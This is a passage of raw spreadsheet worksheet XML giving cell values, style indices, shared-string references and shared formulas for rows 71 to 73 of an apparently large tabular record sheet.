      <c r="CJ71" s="319">
        <v>0</v>
      </c>
      <c r="CK71" s="319">
        <v>0</v>
      </c>
      <c r="CL71" s="319">
        <v>0</v>
      </c>
      <c r="CM71" s="319">
        <f t="shared" si="28"/>
        <v>0</v>
      </c>
      <c r="CN71" s="319">
        <v>0</v>
      </c>
      <c r="CO71" s="319">
        <v>0</v>
      </c>
      <c r="CP71" s="319">
        <v>0</v>
      </c>
      <c r="CQ71" s="319">
        <v>0</v>
      </c>
      <c r="CR71" s="319">
        <v>0</v>
      </c>
      <c r="CS71" s="320">
        <v>0</v>
      </c>
      <c r="CT71" s="339">
        <v>3</v>
      </c>
      <c r="CU71" s="340">
        <v>0</v>
      </c>
      <c r="CV71" s="340">
        <v>44604</v>
      </c>
      <c r="CW71" s="340">
        <v>1</v>
      </c>
      <c r="CX71" s="340"/>
      <c r="CY71" s="340">
        <v>44604</v>
      </c>
      <c r="CZ71" s="340">
        <v>44604</v>
      </c>
      <c r="DA71" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB71" s="340" t="str">
        <f t="shared" si="29"/>
        <v>-, -</v>
      </c>
      <c r="DC71" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD71" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE71" s="340">
        <v>0</v>
      </c>
      <c r="DF71" s="341">
        <v>4</v>
      </c>
      <c r="DG71" s="341">
        <v>2</v>
      </c>
      <c r="DH71" s="341">
        <v>0</v>
      </c>
      <c r="DI71" s="341">
        <v>0</v>
      </c>
      <c r="DJ71" s="341">
        <f t="shared" si="30"/>
        <v>0</v>
      </c>
      <c r="DK71" s="341">
        <v>3</v>
      </c>
      <c r="DL71" s="341">
        <v>0</v>
      </c>
      <c r="DM71" s="341">
        <v>3</v>
      </c>
      <c r="DN71" s="341">
        <v>0</v>
      </c>
      <c r="DO71" s="341">
        <v>3</v>
      </c>
      <c r="DP71" s="342">
        <v>0</v>
      </c>
      <c r="DQ71" s="355">
        <v>5</v>
      </c>
      <c r="DR71" s="356">
        <v>0</v>
      </c>
      <c r="DS71" s="356" t="s">
        <v>1246</v>
      </c>
      <c r="DT71" s="356">
        <v>3</v>
      </c>
      <c r="DU71" s="356"/>
      <c r="DV71" s="356" t="s">
        <v>1246</v>
      </c>
      <c r="DW71" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX71" s="356" t="s">
        <v>1246</v>
      </c>
      <c r="DY71" s="356" t="str">
        <f t="shared" si="31"/>
        <v>-, -</v>
      </c>
      <c r="DZ71" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA71" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB71" s="356">
        <v>0</v>
      </c>
      <c r="EC71" s="357">
        <v>4</v>
      </c>
      <c r="ED71" s="357">
        <v>2</v>
      </c>
      <c r="EE71" s="357">
        <v>0</v>
      </c>
      <c r="EF71" s="357">
        <v>0</v>
      </c>
      <c r="EG71" s="357">
        <f t="shared" si="32"/>
        <v>0</v>
      </c>
      <c r="EH71" s="357">
        <v>4</v>
      </c>
      <c r="EI71" s="357">
        <v>0</v>
      </c>
      <c r="EJ71" s="357">
        <v>3</v>
      </c>
      <c r="EK71" s="357">
        <v>2</v>
      </c>
      <c r="EL71" s="357">
        <v>5</v>
      </c>
      <c r="EM71" s="358">
        <v>0</v>
      </c>
      <c r="EN71" s="368" t="str">
        <f t="shared" si="22"/>
        <v>SI</v>
      </c>
      <c r="EO71" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP71" s="369"/>
      <c r="EQ71" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER71" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES71" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET71" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU71" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV71" s="369"/>
      <c r="EW71" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX71" s="369"/>
      <c r="EY71" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ71" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA71" s="369"/>
      <c r="FB71" s="369"/>
      <c r="FC71" s="369">
        <v>4</v>
      </c>
      <c r="FD71" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE71" s="369">
        <v>0</v>
      </c>
      <c r="FF71" s="369">
        <v>0</v>
      </c>
      <c r="FG71" s="369">
        <v>0</v>
      </c>
      <c r="FH71" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI71" s="377" t="str">
        <f t="shared" si="23"/>
        <v>SI</v>
      </c>
      <c r="FJ71" s="378">
        <v>1</v>
      </c>
      <c r="FK71" s="378"/>
      <c r="FL71" s="378">
        <v>92322</v>
      </c>
      <c r="FM71" s="378">
        <v>1</v>
      </c>
      <c r="FN71" s="378"/>
      <c r="FO71" s="378">
        <v>92322</v>
      </c>
      <c r="FP71" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ71" s="378"/>
      <c r="FR71" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS71" s="380"/>
      <c r="FT71" s="380"/>
      <c r="FU71" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV71" s="378"/>
      <c r="FW71" s="378"/>
      <c r="FX71" s="378">
        <v>7</v>
      </c>
      <c r="FY71" s="378">
        <f t="shared" si="20"/>
        <v>0</v>
      </c>
      <c r="FZ71" s="378">
        <v>0</v>
      </c>
      <c r="GA71" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB71" s="378">
        <v>0</v>
      </c>
      <c r="GC71" s="379" t="s">
        <v>12</v>
      </c>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40"/>
      <c r="IZ71" s="40"/>
      <c r="JA71" s="40"/>
      <c r="JB71" s="40"/>
      <c r="JC71" s="40"/>
      <c r="JD71" s="40"/>
      <c r="JE71" s="40"/>
      <c r="JF71" s="40"/>
      <c r="JG71" s="40"/>
      <c r="JH71" s="40"/>
      <c r="JI71" s="40"/>
      <c r="JJ71" s="40"/>
      <c r="JK71" s="40"/>
      <c r="JL71" s="40"/>
      <c r="JM71" s="40"/>
      <c r="JN71" s="40"/>
      <c r="JO71" s="40"/>
      <c r="JP71" s="40"/>
      <c r="JQ71" s="40"/>
      <c r="JR71" s="40"/>
      <c r="JS71" s="40"/>
      <c r="JT71" s="40"/>
      <c r="JU71" s="40"/>
      <c r="JV71" s="40"/>
      <c r="JW71" s="40"/>
      <c r="JX71" s="40"/>
      <c r="JY71" s="40"/>
      <c r="JZ71" s="40"/>
      <c r="KA71" s="40"/>
      <c r="KB71" s="40"/>
      <c r="KC71" s="40"/>
      <c r="KD71" s="40"/>
      <c r="KE71" s="40"/>
      <c r="KF71" s="40"/>
      <c r="KG71" s="40"/>
      <c r="KH71" s="40"/>
      <c r="KI71" s="40"/>
      <c r="KJ71" s="40"/>
      <c r="KK71" s="40"/>
      <c r="KL71" s="40"/>
      <c r="KM71" s="40"/>
      <c r="KN71" s="40"/>
      <c r="KO71" s="40"/>
      <c r="KP71" s="40"/>
      <c r="KQ71" s="40"/>
      <c r="KR71" s="40"/>
      <c r="KS71" s="40"/>
      <c r="KT71" s="40"/>
      <c r="KU71" s="40"/>
      <c r="KV71" s="40"/>
      <c r="KW71" s="40"/>
      <c r="KX71" s="40"/>
      <c r="KY71" s="40"/>
      <c r="KZ71" s="40"/>
      <c r="LA71" s="40"/>
      <c r="LB71" s="40"/>
      <c r="LC71" s="40"/>
      <c r="LD71" s="40"/>
      <c r="LE71" s="40"/>
      <c r="LF71" s="40"/>
      <c r="LG71" s="40"/>
      <c r="LH71" s="40"/>
      <c r="LI71" s="40"/>
    </row>
    <row r="72" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B72" s="224" t="s">
        <v>1247</v>
      </c>
      <c r="C72" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D72" s="225" t="s">
        <v>177</v>
      </c>
      <c r="E72" s="225" t="s">
        <v>1248</v>
      </c>
      <c r="F72" s="225">
        <v>44</v>
      </c>
      <c r="G72" s="225" t="s">
        <v>1249</v>
      </c>
      <c r="H72" s="226" t="s">
        <v>1250</v>
      </c>
      <c r="I72" s="225"/>
      <c r="J72" s="225" t="s">
        <v>1251</v>
      </c>
      <c r="K72" s="227" t="s">
        <v>1252</v>
      </c>
      <c r="L72" s="228" t="s">
        <v>280</v>
      </c>
      <c r="M72" s="227" t="s">
        <v>828</v>
      </c>
      <c r="N72" s="227" t="s">
        <v>1253</v>
      </c>
      <c r="O72" s="389" t="s">
        <v>2717</v>
      </c>
      <c r="P72" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q72" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R72" s="225"/>
      <c r="S72" s="396"/>
      <c r="T72" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U72" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V72" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W72" s="231"/>
      <c r="X72" s="232" t="s">
        <v>192</v>
      </c>
      <c r="Y72" s="255" t="s">
        <v>186</v>
      </c>
      <c r="Z72" s="256" t="s">
        <v>1254</v>
      </c>
      <c r="AA72" s="257" t="s">
        <v>2413</v>
      </c>
      <c r="AB72" s="256" t="s">
        <v>2475</v>
      </c>
      <c r="AC72" s="260" t="s">
        <v>1252</v>
      </c>
      <c r="AD72" s="258" t="s">
        <v>269</v>
      </c>
      <c r="AE72" s="259" t="s">
        <v>1258</v>
      </c>
      <c r="AF72" s="275" t="s">
        <v>1255</v>
      </c>
      <c r="AG72" s="225" t="s">
        <v>1256</v>
      </c>
      <c r="AH72" s="273" t="s">
        <v>1257</v>
      </c>
      <c r="AI72" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ72" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK72" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL72" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM72" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN72" s="281" t="s">
        <v>13</v>
      </c>
      <c r="AO72" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP72" s="230"/>
      <c r="AQ72" s="230"/>
      <c r="AR72" s="288">
        <v>12</v>
      </c>
      <c r="AS72" s="288">
        <v>1</v>
      </c>
      <c r="AT72" s="288">
        <v>1</v>
      </c>
      <c r="AU72" s="288">
        <f t="shared" si="24"/>
        <v>2</v>
      </c>
      <c r="AV72" s="256" t="s">
        <v>503</v>
      </c>
      <c r="AW72" s="288">
        <v>1</v>
      </c>
      <c r="AX72" s="288">
        <v>1</v>
      </c>
      <c r="AY72" s="288">
        <v>1</v>
      </c>
      <c r="AZ72" s="288">
        <f t="shared" si="21"/>
        <v>2</v>
      </c>
      <c r="BA72" s="289" t="s">
        <v>1266</v>
      </c>
      <c r="BB72" s="301">
        <v>12</v>
      </c>
      <c r="BC72" s="302">
        <v>0</v>
      </c>
      <c r="BD72" s="302">
        <v>1917</v>
      </c>
      <c r="BE72" s="302">
        <v>1</v>
      </c>
      <c r="BF72" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG72" s="302">
        <v>1917</v>
      </c>
      <c r="BH72" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI72" s="302">
        <v>1917</v>
      </c>
      <c r="BJ72" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK72" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL72" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM72" s="302">
        <v>0</v>
      </c>
      <c r="BN72" s="304">
        <v>12</v>
      </c>
      <c r="BO72" s="304">
        <v>3</v>
      </c>
      <c r="BP72" s="304">
        <v>0</v>
      </c>
      <c r="BQ72" s="304">
        <v>0</v>
      </c>
      <c r="BR72" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS72" s="304">
        <v>12</v>
      </c>
      <c r="BT72" s="304">
        <v>0</v>
      </c>
      <c r="BU72" s="304">
        <v>12</v>
      </c>
      <c r="BV72" s="305">
        <v>0</v>
      </c>
      <c r="BW72" s="317">
        <v>14</v>
      </c>
      <c r="BX72" s="318">
        <v>1</v>
      </c>
      <c r="BY72" s="318" t="s">
        <v>1259</v>
      </c>
      <c r="BZ72" s="318">
        <v>3</v>
      </c>
      <c r="CA72" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB72" s="318" t="s">
        <v>1260</v>
      </c>
      <c r="CC72" s="318">
        <v>2035480</v>
      </c>
      <c r="CD72" s="318">
        <v>1917</v>
      </c>
      <c r="CE72" s="318" t="str">
        <f t="shared" si="27"/>
        <v>2025644, -</v>
      </c>
      <c r="CF72" s="327">
        <v>2025644</v>
      </c>
      <c r="CG72" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH72" s="318">
        <v>1</v>
      </c>
      <c r="CI72" s="319">
        <v>12</v>
      </c>
      <c r="CJ72" s="319">
        <v>3</v>
      </c>
      <c r="CK72" s="319">
        <v>0</v>
      </c>
      <c r="CL72" s="319">
        <v>1</v>
      </c>
      <c r="CM72" s="319">
        <f t="shared" si="28"/>
        <v>1</v>
      </c>
      <c r="CN72" s="319">
        <v>14</v>
      </c>
      <c r="CO72" s="319">
        <v>0</v>
      </c>
      <c r="CP72" s="319">
        <v>12</v>
      </c>
      <c r="CQ72" s="319">
        <v>2</v>
      </c>
      <c r="CR72" s="319">
        <v>14</v>
      </c>
      <c r="CS72" s="320">
        <v>0</v>
      </c>
      <c r="CT72" s="339">
        <v>14</v>
      </c>
      <c r="CU72" s="340">
        <v>1</v>
      </c>
      <c r="CV72" s="340" t="s">
        <v>1261</v>
      </c>
      <c r="CW72" s="340">
        <v>3</v>
      </c>
      <c r="CX72" s="340"/>
      <c r="CY72" s="340" t="s">
        <v>1260</v>
      </c>
      <c r="CZ72" s="340">
        <v>2035480</v>
      </c>
      <c r="DA72" s="340">
        <v>1917</v>
      </c>
      <c r="DB72" s="340" t="str">
        <f t="shared" si="29"/>
        <v>2025644, -</v>
      </c>
      <c r="DC72" s="344">
        <v>2025644</v>
      </c>
      <c r="DD72" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE72" s="340">
        <v>1</v>
      </c>
      <c r="DF72" s="341">
        <v>12</v>
      </c>
      <c r="DG72" s="341">
        <v>3</v>
      </c>
      <c r="DH72" s="341">
        <v>0</v>
      </c>
      <c r="DI72" s="341">
        <v>1</v>
      </c>
      <c r="DJ72" s="341">
        <f t="shared" si="30"/>
        <v>1</v>
      </c>
      <c r="DK72" s="341">
        <v>14</v>
      </c>
      <c r="DL72" s="341">
        <v>0</v>
      </c>
      <c r="DM72" s="341">
        <v>12</v>
      </c>
      <c r="DN72" s="341">
        <v>2</v>
      </c>
      <c r="DO72" s="341">
        <v>14</v>
      </c>
      <c r="DP72" s="342">
        <v>0</v>
      </c>
      <c r="DQ72" s="355">
        <v>31</v>
      </c>
      <c r="DR72" s="356">
        <v>1</v>
      </c>
      <c r="DS72" s="356" t="s">
        <v>1262</v>
      </c>
      <c r="DT72" s="356">
        <v>7</v>
      </c>
      <c r="DU72" s="356"/>
      <c r="DV72" s="356" t="s">
        <v>1263</v>
      </c>
      <c r="DW72" s="356" t="s">
        <v>1264</v>
      </c>
      <c r="DX72" s="356" t="s">
        <v>1265</v>
      </c>
      <c r="DY72" s="356" t="str">
        <f t="shared" si="31"/>
        <v>2025644, -</v>
      </c>
      <c r="DZ72" s="356">
        <v>2025644</v>
      </c>
      <c r="EA72" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB72" s="356">
        <v>1</v>
      </c>
      <c r="EC72" s="357">
        <v>12</v>
      </c>
      <c r="ED72" s="357">
        <v>4</v>
      </c>
      <c r="EE72" s="357">
        <v>0</v>
      </c>
      <c r="EF72" s="357">
        <v>0</v>
      </c>
      <c r="EG72" s="357">
        <f t="shared" si="32"/>
        <v>0</v>
      </c>
      <c r="EH72" s="357">
        <v>16</v>
      </c>
      <c r="EI72" s="357">
        <v>0</v>
      </c>
      <c r="EJ72" s="357">
        <v>12</v>
      </c>
      <c r="EK72" s="357">
        <v>19</v>
      </c>
      <c r="EL72" s="357">
        <v>31</v>
      </c>
      <c r="EM72" s="358">
        <v>0</v>
      </c>
      <c r="EN72" s="368" t="str">
        <f t="shared" si="22"/>
        <v>SI</v>
      </c>
      <c r="EO72" s="369">
        <v>2</v>
      </c>
      <c r="EP72" s="369"/>
      <c r="EQ72" s="369">
        <v>12449</v>
      </c>
      <c r="ER72" s="369">
        <v>1</v>
      </c>
      <c r="ES72" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET72" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU72" s="369">
        <v>12449</v>
      </c>
      <c r="EV72" s="369"/>
      <c r="EW72" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX72" s="369"/>
      <c r="EY72" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ72" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA72" s="369"/>
      <c r="FB72" s="369"/>
      <c r="FC72" s="369">
        <v>7</v>
      </c>
      <c r="FD72" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE72" s="369">
        <v>0</v>
      </c>
      <c r="FF72" s="369">
        <v>0</v>
      </c>
      <c r="FG72" s="369">
        <v>1</v>
      </c>
      <c r="FH72" s="370" t="s">
        <v>1267</v>
      </c>
      <c r="FI72" s="377" t="str">
        <f t="shared" si="23"/>
        <v>SI</v>
      </c>
      <c r="FJ72" s="378">
        <v>1</v>
      </c>
      <c r="FK72" s="378"/>
      <c r="FL72" s="383">
        <v>33515</v>
      </c>
      <c r="FM72" s="378">
        <v>1</v>
      </c>
      <c r="FN72" s="378"/>
      <c r="FO72" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP72" s="378">
        <v>33515</v>
      </c>
      <c r="FQ72" s="378"/>
      <c r="FR72" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS72" s="380"/>
      <c r="FT72" s="380"/>
      <c r="FU72" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV72" s="378"/>
      <c r="FW72" s="378"/>
      <c r="FX72" s="378">
        <v>0</v>
      </c>
      <c r="FY72" s="378">
        <f t="shared" si="20"/>
        <v>1</v>
      </c>
      <c r="FZ72" s="378">
        <v>1</v>
      </c>
      <c r="GA72" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB72" s="378">
        <v>2</v>
      </c>
      <c r="GC72" s="379" t="s">
        <v>1268</v>
      </c>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J72" s="40"/>
      <c r="JK72" s="40"/>
      <c r="JL72" s="40"/>
      <c r="JM72" s="40"/>
      <c r="JN72" s="40"/>
      <c r="JO72" s="40"/>
      <c r="JP72" s="40"/>
      <c r="JQ72" s="40"/>
      <c r="JR72" s="40"/>
      <c r="JS72" s="40"/>
      <c r="JT72" s="40"/>
      <c r="JU72" s="40"/>
      <c r="JV72" s="40"/>
      <c r="JW72" s="40"/>
      <c r="JX72" s="40"/>
      <c r="JY72" s="40"/>
      <c r="JZ72" s="40"/>
      <c r="KA72" s="40"/>
      <c r="KB72" s="40"/>
      <c r="KC72" s="40"/>
      <c r="KD72" s="40"/>
      <c r="KE72" s="40"/>
      <c r="KF72" s="40"/>
      <c r="KG72" s="40"/>
      <c r="KH72" s="40"/>
      <c r="KI72" s="40"/>
      <c r="KJ72" s="40"/>
      <c r="KK72" s="40"/>
      <c r="KL72" s="40"/>
      <c r="KM72" s="40"/>
      <c r="KN72" s="40"/>
      <c r="KO72" s="40"/>
      <c r="KP72" s="40"/>
      <c r="KQ72" s="40"/>
      <c r="KR72" s="40"/>
      <c r="KS72" s="40"/>
      <c r="KT72" s="40"/>
      <c r="KU72" s="40"/>
      <c r="KV72" s="40"/>
      <c r="KW72" s="40"/>
      <c r="KX72" s="40"/>
      <c r="KY72" s="40"/>
      <c r="KZ72" s="40"/>
      <c r="LA72" s="40"/>
      <c r="LB72" s="40"/>
      <c r="LC72" s="40"/>
      <c r="LD72" s="40"/>
      <c r="LE72" s="40"/>
      <c r="LF72" s="40"/>
      <c r="LG72" s="40"/>
      <c r="LH72" s="40"/>
      <c r="LI72" s="40"/>
    </row>
    <row r="73" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B73" s="224" t="s">
        <v>1247</v>
      </c>
      <c r="C73" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D73" s="225" t="s">
        <v>177</v>
      </c>
      <c r="E73" s="225" t="s">
        <v>1269</v>
      </c>
      <c r="F73" s="225">
        <v>45</v>
      </c>
      <c r="G73" s="225" t="s">
        <v>1270</v>
      </c>
      <c r="H73" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I73" s="225"/>
      <c r="J73" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K73" s="227" t="s">
        <v>1271</v>
      </c>
      <c r="L73" s="228" t="s">
        <v>12</v>
      </c>
      <c r="M73" s="227" t="s">
        <v>1272</v>
      </c>
      <c r="N73" s="227" t="s">
        <v>1273</v>
      </c>
      <c r="O73" s="389" t="s">
        <v>2718</v>
      </c>
      <c r="P73" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q73" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R73" s="225"/>
      <c r="S73" s="396"/>
      <c r="T73" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U73" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V73" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W73" s="231"/>
      <c r="X73" s="232" t="s">
        <v>192</v>
      </c>
      <c r="Y73" s="255" t="s">
        <v>186</v>
      </c>
      <c r="Z73" s="256" t="s">
        <v>1274</v>
      </c>
      <c r="AA73" s="257" t="s">
        <v>2413</v>
      </c>
      <c r="AB73" s="256" t="s">
        <v>2476</v>
      </c>
      <c r="AC73" s="261" t="s">
        <v>2514</v>
      </c>
      <c r="AD73" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE73" s="259" t="s">
        <v>1278</v>
      </c>
      <c r="AF73" s="270" t="s">
        <v>1275</v>
      </c>
      <c r="AG73" s="225" t="s">
        <v>1276</v>
      </c>
      <c r="AH73" s="271" t="s">
        <v>1277</v>
      </c>
      <c r="AI73" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ73" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK73" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL73" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM73" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN73" s="281" t="s">
        <v>13</v>
      </c>
      <c r="AO73" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP73" s="230"/>
      <c r="AQ73" s="230"/>
      <c r="AR73" s="288">
        <v>13</v>
      </c>
      <c r="AS73" s="288">
        <v>1</v>
      </c>
      <c r="AT73" s="288">
        <v>0</v>
      </c>
      <c r="AU73" s="288">
        <f t="shared" si="24"/>
        <v>1</v>
      </c>
      <c r="AV73" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW73" s="288">
        <v>1</v>
      </c>
      <c r="AX73" s="288">
        <v>1</v>
      </c>
      <c r="AY73" s="288">
        <v>0</v>
      </c>
      <c r="AZ73" s="288">
        <f t="shared" si="21"/>
        <v>1</v>
      </c>
      <c r="BA73" s="289" t="s">
        <v>1280</v>
      </c>
      <c r="BB73" s="301">
        <v>2</v>
      </c>
      <c r="BC73" s="302">
        <v>0</v>
      </c>
      <c r="BD73" s="302">
        <v>254</v>
      </c>
      <c r="BE73" s="302">
        <v>1</v>
      </c>
      <c r="BF73" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG73" s="302">
        <v>254</v>
      </c>
      <c r="BH73" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI73" s="302">
        <v>254</v>
      </c>
      <c r="BJ73" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK73" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL73" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM73" s="302">
        <v>0</v>
      </c>
      <c r="BN73" s="304">
        <v>13</v>
      </c>
      <c r="BO73" s="304">
        <v>2</v>
      </c>
      <c r="BP73" s="304">
        <v>0</v>
      </c>
      <c r="BQ73" s="304">
        <v>0</v>
      </c>
      <c r="BR73" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS73" s="304">
        <v>2</v>
      </c>
      <c r="BT73" s="304">
        <v>0</v>
      </c>
      <c r="BU73" s="304">
        <v>2</v>
      </c>
      <c r="BV73" s="305">
        <v>0</v>
      </c>
      <c r="BW73" s="317">
        <v>2</v>
      </c>
      <c r="BX73" s="318">
        <v>0</v>
      </c>
      <c r="BY73" s="318">
        <v>254</v>
      </c>
      <c r="BZ73" s="318">
        <v>1</v>
      </c>
      <c r="CA73" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB73" s="318">
        <v>254</v>
      </c>
      <c r="CC73" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD73" s="318">
        <v>254</v>
      </c>
      <c r="CE73" s="318" t="str">
        <f t="shared" si="27"/>
        <v>-, -</v>
      </c>
      <c r="CF73" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG73" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH73" s="318">
        <v>0</v>
      </c>
      <c r="CI73" s="319">
        <v>11</v>
      </c>
      <c r="CJ73" s="319">
        <v>2</v>
      </c>
      <c r="CK73" s="319">
        <v>0</v>
      </c>
      <c r="CL73" s="319">
        <v>0</v>
      </c>
      <c r="CM73" s="319">
        <f t="shared" si="28"/>
        <v>0</v>
      </c>
      <c r="CN73" s="319">
        <v>2</v>
      </c>
      <c r="CO73" s="319">
        <v>0</v>
      </c>
      <c r="CP73" s="319">
        <v>2</v>
      </c>
      <c r="CQ73" s="319">
        <v>0</v>
      </c>
      <c r="CR73" s="319">
        <v>2</v>
      </c>
      <c r="CS73" s="320">
        <v>0</v>
      </c>
      <c r="CT73" s="339">
        <v>2</v>
      </c>
      <c r="CU73" s="340">
        <v>0</v>
      </c>
      <c r="CV73" s="340">
        <v>254</v>
      </c>
      <c r="CW73" s="340">
        <v>1</v>
      </c>
      <c r="CX73" s="340"/>
      <c r="CY73" s="340">
        <v>254</v>
      </c>
      <c r="CZ73" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA73" s="340">
        <v>254</v>
      </c>
      <c r="DB73" s="340" t="str">
        <f t="shared" si="29"/>
        <v>-, -</v>
      </c>
      <c r="DC73" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD73" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE73" s="340">
        <v>0</v>
      </c>
      <c r="DF73" s="341">
        <v>13</v>
      </c>
      <c r="DG73" s="341">
        <v>2</v>
      </c>
      <c r="DH73" s="341">
        <v>0</v>
      </c>
      <c r="DI73" s="341">
        <v>0</v>
      </c>
      <c r="DJ73" s="341">
        <f t="shared" si="30"/>
        <v>0</v>
      </c>
      <c r="DK73" s="341">
        <v>2</v>
      </c>
      <c r="DL73" s="341">
        <v>0</v>
      </c>
      <c r="DM73" s="341">
        <v>2</v>
      </c>
      <c r="DN73" s="341">
        <v>0</v>
      </c>
      <c r="DO73" s="341">
        <v>2</v>
      </c>
      <c r="DP73" s="342">
        <v>0</v>
      </c>
      <c r="DQ73" s="355">
        <v>10</v>
      </c>
      <c r="DR73" s="356">
        <v>0</v>
      </c>
      <c r="DS73" s="356" t="s">
        <v>1279</v>
      </c>
      <c r="DT73" s="356">
        <v>3</v>
      </c>
      <c r="DU73" s="356"/>
      <c r="DV73" s="356" t="s">
        <v>1279</v>
      </c>
      <c r="DW73" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX73" s="356" t="s">
        <v>1279</v>
      </c>
      <c r="DY73" s="356" t="str">
        <f t="shared" si="31"/>
        <v>-, -</v>
      </c>
      <c r="DZ73" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA73" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB73" s="356">
        <v>0</v>
      </c>
      <c r="EC73" s="357">
        <v>11</v>
      </c>
      <c r="ED73" s="357">
        <v>4</v>
      </c>
      <c r="EE73" s="357">
        <v>0</v>
      </c>
      <c r="EF73" s="357">
        <v>0</v>
      </c>
      <c r="EG73" s="357">
        <f t="shared" si="32"/>
        <v>0</v>
      </c>
      <c r="EH73" s="357">
        <v>6</v>
      </c>
      <c r="EI73" s="357">
        <v>0</v>
      </c>
      <c r="EJ73" s="357">
        <v>2</v>
      </c>
      <c r="EK73" s="357">
        <v>10</v>
      </c>
      <c r="EL73" s="357">
        <v>12</v>
      </c>
      <c r="EM73" s="358">
        <v>0</v>
      </c>
      <c r="EN73" s="368" t="str">
        <f t="shared" si="22"/>
        <v>SI</v>
      </c>
      <c r="EO73" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP73" s="369"/>
      <c r="EQ73" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER73" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES73" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET73" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU73" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV73" s="369"/>
      <c r="EW73" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX73" s="369"/>
      <c r="EY73" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ73" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA73" s="369"/>
      <c r="FB73" s="369"/>
      <c r="FC73" s="369">
        <v>11</v>
      </c>
      <c r="FD73" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
